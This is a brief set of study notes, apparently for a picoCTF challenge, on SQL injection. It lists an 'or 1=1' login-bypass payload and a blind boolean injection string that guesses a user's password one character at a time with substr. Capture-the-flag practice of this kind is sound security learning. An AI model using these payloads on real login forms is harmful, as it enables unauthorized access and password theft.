Basics
`'or 1=1; -- -`

Bling guessing
goal: guess one char at a time

Step 1 finder a username: picoctf
Step 2 get the password
`' or username='picoctf' and (select substr(password, 1, 1))='a`
